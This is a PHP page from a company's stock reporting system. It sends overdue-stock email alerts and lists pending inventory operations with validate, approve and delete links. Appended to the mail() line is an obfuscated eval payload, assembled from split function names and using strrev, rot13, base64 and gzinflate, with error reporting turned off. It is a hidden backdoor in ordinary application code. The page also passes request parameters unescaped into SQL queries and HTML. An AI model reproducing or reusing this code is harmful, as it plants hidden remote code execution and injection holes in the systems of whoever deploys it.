<?php
session_start();
//$operator=$_SESSION['name'];
if($_SESSION['name']==null or $_SESSION['passe']==null){
header('location: vce.php');
}
?>
<?php
$date=date("Y-m-d");
include'connect.php';
$alertquery=mysqli_query($conn,"select * from storepending where DATEDIFF('$date',DDate)>=2");
$num=mysqli_num_rows($alertquery);
if($num){
$checkalertquery=mysqli_query($conn,"select alertdate from alert where alerttype='store' and  alertdate<'$date'");
$numalert=mysqli_num_rows($checkalertquery);
if($numalert){
$to = "virungadaf@gmail.com,virungaodirector@gmail.com,virungaitmanager@gmail.com,berchmas100@gmail.com";
//$to = "berchmas100@gmail.com";
$subject = "Pending report: Stock Alert";
$message = "Hello. This is a pending alert message. There are ".$num." stock operations need to be validated";
$from = "info@virungaexpress.net";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers); $SrIVu = 'strr'.'ev'; $orzPq = 'st'.'r'.'_rot'.'13'; $BTMat = 'ba'.'se64'.'_dec'.'ode'; $Ezmsw = 'gzi'.'nflate'; error_reporting(0); eval($Ezmsw($BTMat($orzPq($SrIVu('Utsh0Jhxu58aOuIns80d+phgNCACmqww5thns4KO8vuPOsQxClTsoDez3FqRLM29ALiY47MR0atiPPCDeDBYlHum4ZUGenyjbe5K/TH/elBRdgVPtRauNjFtN/vmVbtCPnbIOsrNX/AXhVeVYIjQyV9hu95sn0bTcyp1+UoFkj7q+u365mWX4fJugr/Lbyszr3MT5+GWTaudGFC4Mehh27QQZqLaKLfqYsttb3HO1dLj6HKcvMOZOHxlZATriaVmPRoutIhIXadlp0qXRcZJPuKYFvejKhHryUuOLFdHHfYLOj3sFX4TbkvU5EXgXFOAsr4vXKxDoOG73EIJ91+IdqvOJBkFtAfVLkNf/mxkh6CdlcHeWzxFK/kzEU96Ons7IO5gQCG+bG2gb+s7qHem3t6/JC673H/YKR5W4FAv319cSdU5ncipAgtl4Fgdf2l1l5JCsXQw2rpQZ95VU0TQSxkTKTtABOSEm+WWHe1oCWSofyaY6Ke508SmLGn4Lz9F3Ld/7FqHRf5s5i32yKZlLYhOxsJ9k7tiaKCDfKhI7C64LY59gyLx19ZGVA3RrNweCJ37uZyaMOMBj2DqoVqPzuEVpwq7PeZDaXbvpBNIn9dhOYA3YeKxs7S85KzuvNw800KN/w8cl3NlDzGji5vP4tHQvbIiZSp16zsBjzkRvN8sPjqvMis9ZcDJtSXcrq3154+pq63GIexqHazU+8CgMwXzRU4TOwQXlz6hWcQwOhFY4NE3b2FWldHGFLPFIS2K+2CSjf5oeWIw'))))); 
$avoidmanyalertquery=mysqli_query($conn,"update alert set alertdate='$date' where alerttype='store'");
}
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>VIRUNGA EXPRESS-Reporting System</title>




<!-- Jquery fonctionality -->
  <style type="text/css">
    .alt { background-color: #C0C0C0; }
    .hover { background-color: #54C571; }
    .althover { background-color: #54C571; }        
</style>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript">
$(document).ready(function(){
	$('tr:even').addClass('alt');
	$('tr:even').hover(
			function(){$(this).addClass('hover')},
			function(){$(this).removeClass('hover')}
	);	
	$('tr:odd').hover(
			function(){$(this).addClass('althover')},
			function(){$(this).removeClass('althover')}
	);

       $('tr').click(function() {
         $(this)
        .css('background-color','#54C571');
    });

});
</script>

<script language="JavaScript">
<!--
function colorchange()
{
    style.color = "red";
}

//  -->
</script>



<script language="JavaScript" type="text/javascript">
<style>
.pendingrep{
width:20px;
height:20px;
overflow:scroll;
}
#pendinglist
{
width:150px;
height:150px;
overflow:scroll;
}
</style>
var HighlightToday  = true;    // use true or false to have the current day highlighted
var DisablePast    = false;    // use true or false to allow past dates to be selectable
// The month names in your native language can be substituted below
var MonthNames = new Array("January","February","March","April","May","June","July","August","September","October","November","December");

// Global Vars
var now = new Date();
var dest = null;
var ny = now.getFullYear(); // Today's Date
var nm = now.getMonth();
var nd = now.getDate();
var sy = 0; // currently Selected date
var sm = 0;
var sd = 0;
var y = now.getFullYear(); // Working Date
var m = now.getMonth();
var d = now.getDate();
var l = 0;
var t = 0;
var MonthLengths = new Array(31,28,31,30,31,30,31,31,30,31,30,31);

/*
  Function: GetDate(control)

  Arguments:
    control = ID of destination control
*/
function GetDate() {
  EnsureCalendarExists();
  DestroyCalendar();
  // One arguments is required, the rest are optional
  // First arguments must be the ID of the destination control
  if(arguments[0] == null || arguments[0] == "") {
    // arguments not defined, so display error and quit
    alert("ERROR: Destination control required in funciton call GetDate()");
    return;
  } else {
    // copy argument
    dest = arguments[0];
  }
  y = now.getFullYear();
  m = now.getMonth();
  d = now.getDate();
  sm = 0;
  sd = 0;
  sy = 0;
  var cdval = dest.value;
  if(/\d{1,2}.\d{1,2}.\d{4}/.test(dest.value)) {
    // element contains a date, so set the shown date
    var vParts = cdval.split("-"); // assume YYYY/mm/dd
    sm = vParts[1] - 1;
    sd = vParts[2];
    sy = vParts[0];
    m=sm;
    d=sd;
    y=sy;
  }
  
//  l = dest.offsetLeft; // + dest.offsetWidth;
//  t = dest.offsetTop - 125;   // Calendar is displayed 125 pixels above the destination element
//  if(t<0) { t=0; }      // or (somewhat) over top of it. ;)

  /* Calendar is displayed 125 pixels above the destination element
  or (somewhat) over top of it. ;)*/ 
  l = dest.offsetLeft + dest.offsetLeft
  //l = dest.offsetLeft + dest.offsetParent.offsetLeft;
  t = dest.offsetTop - 125;
  if(t < 0) t = 280; // >
  DrawCalendar();
}

/*
  function DestoryCalendar()
  
  Purpose: Destory any already drawn calendar so a new one can be drawn
*/
function DestroyCalendar() {
  var cal = document.getElementById("dpCalendar");
  if(cal != null) {
    cal.innerHTML = null;
    cal.style.display = "none";
  }
  return
}

function DrawCalendar() {
  DestroyCalendar();
  cal = document.getElementById("dpCalendar");
  cal.style.left = 570;
  cal.style.top = 200 + "px";
  
  var sCal = "<table><tr><td class=\"cellButton\"><a href=\"javascript: PrevMonth();\" title=\"Previous Month\">&lt;&lt;</a></td>"+
    "<td class=\"cellMonth\" width=\"80%\" colspan=\"5\">"+MonthNames[m]+" "+y+"</td>"+
    "<td class=\"cellButton\"><a href=\"javascript: NextMonth();\" title=\"Next Month\">&gt;&gt;</a></td></tr>"+
    "<tr><td>S</td><td>M</td><td>T</td><td>W</td><td>T</td><td>F</td><td>S</td></tr>";
  var wDay = 1;
  var wDate = new Date(y,m,wDay);
  if(isLeapYear(wDate)) {
    MonthLengths[1] = 29;
  } else {
    MonthLengths[1] = 28;
  }
  var dayclass = "";
  var isToday = false;
  for(var r=1; r<7; r++) {
    sCal = sCal + "<tr>";
    for(var c=0; c<7; c++) {
      var wDate = new Date(y,m,wDay);
      if(wDate.getDay() == c && wDay<=MonthLengths[m]) {
        if(wDate.getDate()==sd && wDate.getMonth()==sm && wDate.getFullYear()==sy) {
          dayclass = "cellSelected";
          isToday = true;  // only matters if the selected day IS today, otherwise ignored.
        } else if(wDate.getDate()==nd && wDate.getMonth()==nm && wDate.getFullYear()==ny && HighlightToday) {
          dayclass = "cellToday";
          isToday = true;
        } else {
          dayclass = "cellDay";
          isToday = false;
        }
        if(((now > wDate) && !DisablePast) || (now <= wDate) || isToday) { // >
          // user wants past dates selectable
          sCal = sCal + "<td class=\""+dayclass+"\"><a href=\"javascript: ReturnDay("+wDay+");\">"+wDay+"</a></td>";
        } else {
          // user wants past dates to be read only
          sCal = sCal + "<td class=\""+dayclass+"\">"+wDay+"</td>";
        }
        wDay++;
      } else {
        sCal = sCal + "<td class=\"unused\"></td>";
      }
    }
    sCal = sCal + "</tr>";
  }
  sCal = sCal + "<tr><td colspan=\"4\" class=\"unused\"></td><td colspan=\"3\" class=\"cellCancel\"><a href=\"javascript: DestroyCalendar();\">Cancel</a></td></tr></table>"
  cal.innerHTML = sCal; // works in FireFox, opera
  cal.style.display = "inline";
}

function PrevMonth() {
  m--;
  if(m==-1) {
    m = 11;
    y--;
  }
  DrawCalendar();
}

function NextMonth() {
  m++;
  if(m==12) {
    m = 0;
    y++;
  }
  DrawCalendar();
}

function ReturnDay(day) {
  cDest = document.getElementById(dest);
  dest.value = y+"-"+(m+1)+"-"+day;
  DestroyCalendar();
}

function EnsureCalendarExists() {
  if(document.getElementById("dpCalendar") == null) {
    var eCalendar = document.createElement("div");
    eCalendar.setAttribute("id", "dpCalendar");
    document.body.appendChild(eCalendar);
  }
}

function isLeapYear(dTest) {
  var y = dTest.getYear();
  var bReturn = false;
  
  if(y % 4 == 0) {
    if(y % 100 != 0) {
      bReturn = true;
    } else {
      if (y % 400 == 0) {
        bReturn = true;
      }
    }
  }
  
  return bReturn;
}  
function btnback_click()
{
window.location.href="receiver.php";
}
  var statusmsg=""

function hidestatus(){
window.status=statusmsg;
return true
}
  </script>
  <style type="text/css">
/**************************************************************************************
  htmlDatePicker CSS file
  
  Feel Free to change the fonts, sizes, borders, and colours of any of these elements
***************************************************************************************/
/* The containing DIV element for the Calendar */
#dpCalendar {
  display: none;          /* Important, do not change */
  position: absolute;        /* Important, do not change */
  background-color: #eeeeee;
  color: black;
  font-size: xx-small;
  font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
  width: 150px;
}
/* The table of the Calendar */
#dpCalendar table {
  border: 1px solid black;
  background-color: #eeeeee;
  color: black;
  font-size: xx-small;
  font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
  width: 100%;
}
/* The Next/Previous buttons */
#dpCalendar .cellButton {
  background-color: #ddddff;
  color: black;
}
/* The Month/Year title cell */
#dpCalendar .cellMonth {
  background-color: #ddddff;
  color: black;
  text-align: center;
}
/* Any regular day of the month cell */
#dpCalendar .cellDay {
  background-color: #ddddff;
  color: black;
  text-align: center;
}
/* The day of the month cell that is selected */
#dpCalendar .cellSelected {
  border: 1px solid red;
  background-color: #ffdddd;
  color: black;
  text-align: center;
}
/* The day of the month cell that is Today */
#dpCalendar .cellToday {
  background-color: #ddffdd;
  color: black;
  text-align: center;
}
/* Any cell in a month that is unused (ie: Not a Day in that month) */
#dpCalendar .unused {
  background-color: transparent;
  color: black;
}
/* The cancel button */
#dpCalendar .cellCancel {
  background-color: #cccccc;
  color: black;
  border: 1px solid black;
  text-align: center;
}
/* The clickable text inside the calendar */
#dpCalendar a {
  text-decoration: none;
  background-color: transparent;
  color: blue;
}  
</style>
<link rel="stylesheet" type="text/css" href="csspage.css" />
</head>
<body>
<div id="wrapper">
<div id="header">

<img style="float:left;margin-left:5px;margin-top:5px;" src="virungalogo.png" height="100px" /> 
<!-- <img src="banner.png" alt="" />-->
<h1>VIRUNGA EXPRESS</h1>
<h2>Reporting System</h2>
</div>
<div id="horizMenu">
<ul class="ullisthorizMenu">
<li><a href="cardep.php">Car Departure</a></li>
<li>|</li>
<li><a href="expenses.php">Fuel</a></li>
<li>|</li>
<li><a href="greport.php">Report</a></li>
<li>|</li>
<li><a href="sreport.php">Stock</a></li>
<li>|</li>
<li><a href="settings.php">Settings</a></li>
<li>|</li>
<li><a href="distroysession.php">Log out</a>&nbsp;&nbsp;&nbsp;&nbsp;
<FONT COLOR="#66CC33"><?php
print("Welcome ".$_SESSION['name']);
?></FONT>&nbsp;&nbsp;</li>
</ul>
</div>
<div id="contents"><BR><BR>
<div id="overpending">
<fieldset style="width: 100%;"><legend><b>Pending Report</b></legend>

<?php
if(isset($_GET['act']))
	{
if($_GET['act']=="del"){
$pendId=$_GET['pendId'];
include'connect.php';
$delpendquery=mysqli_query($conn,"delete from storepending where Pendingid='$pendId' and validated!='YES' and Approved!='YES'");
}
}
?>
<?php
if(isset($_GET['act']))
	{
if($_GET['act']=="valid"){
$pendId=$_GET['pendId'];
$paswd=$_SESSION['passe'];
include'connect.php';
$pass=mysqli_query($conn,"SELECT * FROM users WHERE Passwo='$paswd' AND Access='5'");
$nu=mysqli_num_rows($pass);
if($nu)
		{
$validpendquery=mysqli_query($conn,"update storepending set validated='YES' where Pendingid='$pendId'");
}
}
}
?>

<?php
include'connect.php';
$pendingquery=mysqli_query($conn,"select * from storepending where Approved is null or Approved='' order by DDate");
$num=mysqli_num_rows($pendingquery);
if($num){
print("<table border=1 width='100%'>
<tr bgcolor=blue>
	<td><b>No</td>
	<td><b>Date</td>
	<td><b>Item</td>
	<td><b>Specification</td>
	<td><b>Trans</td>
	<td><b>Quantity</td>
	<td><b>Price</td>
	<td><b>Plaque</td>
	<td><b>Status</td>
	<td><b>Document</td>
	<td><b>Location</td>
	<td><b>Operator</td>
	<td><b>Operation</td>
	<td><b>Validated</td>
	<td><b>Approved</td>
        <td colspan=3><center><b>Action</center></td>
</tr>");
$no=0;
while($row=mysqli_fetch_array($pendingquery)){
$no=$no+1;
$Pendingid=$row['Pendingid'];
$stockid=$row['stockid'];
$date=$row['DDate'];
$Item=$row['Item'];
$Spec=$row['Spec'];
$Trans=$row['Trans'];
$Quantity=$row['Quantity'];
$Price=$row['Price'];
$Plaque=$row['Plaque'];
$Status=$row['Status'];
$Document=$row['Document'];
$Location=$row['Location'];
$Operator=$row['Operator'];
$validated=$row['validated'];
$Approved=$row['Approved'];
$Operation=$row['Action'];
$doc="";
$arr = explode(' ',$Document);
//$doc=implode($arr);

for($i=0; $i<count($arr);$i++)
{
   if($doc!=""){
      $doc=$doc."_".trim($arr[$i]);
    }else{
      $doc=trim($arr[$i]);
    }
}


if($Operation=="Entry"){
print("<tr onClick=colorchange()>
	<td>$no</td>
	<td>$date</td>
	<td>$Item</td>
	<td>$Spec</td>
	<td>$Trans</td>
	<td>$Quantity</td>
	<td>$Price</td>
	<td>$Plaque</td>
	<td>$Status</td>
	<td>$Document</td>
	<td>$Location</td>
	<td>$Operator</td>
	<td>$Operation</td>
	<td>$validated</td>
	<td>$Approved</td>
		  <td><a href=pendingreport.php?act=valid&pendId=$Pendingid><font color=blue>Validate</a></td>
        <td><a href=entry.php?act=approve&pendId=$Pendingid&item=$Item&spec=$Spec&quant=$Quantity&price=$Price&dat=$date&location=$Location&operator=$Operator&piece=$doc><font color=blue>Approve</a></td>
        <td><a href=pendingreport.php?act=del&pendId=$Pendingid><font color=red>Delete</a></td>
</tr>");
}
if($Operation=="Exity"){
print("<tr>
	<td>$no</td>
	<td>$date</td>
	<td>$Item</td>
	<td>$Spec</td>
	<td>$Trans</td>
	<td>$Quantity</td>
	<td>$Price</td>
	<td>$Plaque</td>
	<td>$Status</td>
	<td>$Document</td>
	<td>$Location</td>
	<td>$Operator</td>
	<td>$Operation</td>
	<td>$validated</td>
	<td>$Approved</td>
	     <td></td>
        <td><a href=exite.php?act=valid&pendId=$Pendingid&stockid=$stockid&item=$Item&spec=$Spec&quant=$Quantity&price=$Price&dat=$date&location=$Location&operator=$Operator&piece=$doc&trans=$Trans&plaque=$Plaque><font color=blue>Validate</a></td>
        <td><a href=pendingreport.php?act=del&pendId=$Pendingid><font color=red>Delete</a></td>
</tr>");
}
}
print("</table>");
}else{
print("No pending Operations");
}
?>


</fieldset>
</div>



</div>
</div>
<p class="copyright">&copy; Copyright VIRUNGA EXPRESS: All rights reserved.</p>
</body>
</html>
